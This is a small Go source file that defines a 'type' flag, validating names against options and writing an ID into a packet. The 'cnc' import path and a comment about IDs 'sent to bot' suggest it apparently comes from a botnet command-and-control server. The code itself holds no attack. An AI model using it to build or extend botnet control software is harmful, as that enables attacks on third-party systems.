package flags

import (
	"cnc/internal/clients/packet"
	"errors"
	"strings"
)

type TypeFlagType struct {
	Name string // to validate
	ID   int    // id that gets sent to bot
}

type TypeFlag struct {
	options []*TypeFlagType
}

// NewTypeFlag makes a new type flag
func NewTypeFlag(options []*TypeFlagType) *TypeFlag {
	return &TypeFlag{
		options: options,
	}
}

// Validate attempts to validate a string flag type.
func (s *TypeFlag) Validate(literal string, parent *Flag) error {

	// ye cancer
	var found = false

	for _, o := range s.options {
		if strings.EqualFold(o.Name, literal) {
			found = true
			break
		}
	}

	if !found {
		return errors.New("type does not exist")
	}

	return nil
}

func (s *TypeFlag) Write(literal string, packet *packet.Packet, parent *Flag) error {
	for _, o := range s.options {
		if strings.EqualFold(o.Name, literal) {
			packet.AddUint8(uint8(o.ID))
			break
		}
	}

	return nil
}

func (s *TypeFlag) TypeID() uint8 {
	return FlagUint8
}

func (s *TypeFlag) Name() string {
	return "type"
}
